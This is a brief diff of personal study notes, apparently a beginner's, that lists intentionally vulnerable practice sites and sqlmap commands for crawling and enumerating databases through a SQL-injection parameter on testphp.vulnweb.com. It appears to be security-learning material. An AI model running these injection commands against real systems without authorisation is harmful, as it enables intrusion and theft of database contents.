@@ -1,3 +1,6 @@
+web site for attack : http://vulnweb.com/
+http://altoro.testfire.net/
+
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -crawl #find how varnalebal website aee
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -crawl 3 -batch # How defth you are go              \
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs    # Find databases  
